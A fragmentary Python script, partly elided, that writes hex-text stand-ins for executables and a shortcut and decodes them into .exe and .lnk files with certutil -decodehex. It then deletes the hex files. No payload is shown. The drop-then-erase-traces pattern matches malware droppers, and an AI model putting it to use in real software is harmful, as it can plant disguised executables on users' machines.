...
f = open("D:\\Do_not_misuse_E.txt", 'w') #generate text of hex codes of Do_not_misuse.exe
f.write('')
f.close()

f = open("D:\\Do_not_misuse_L.txt", 'w') #generate text of hex codes of Do_not_misuse.lnk
...
f = open("D:\\After_use.txt", 'w') #generate text of hex codes of After_use.exe
f.write('')
f.close()
...
subprocess.run('certutil -f -decodehex D:\\Do_not_misuse_E.txt D:\\Do_not_misuse.exe 12 ' #decode Do_not_misuse.exe
                ...
                +'&& del D:\\Do_not_misuse_E.txt ' #delete text of Do_not_misuse.exe
                +'&& del D:\\Do_not_misuse_L.txt ' #delete text of Do_not_misuse.lnk
                +'&& del D:\\After_use.txt ' #delete text of After_use.exe
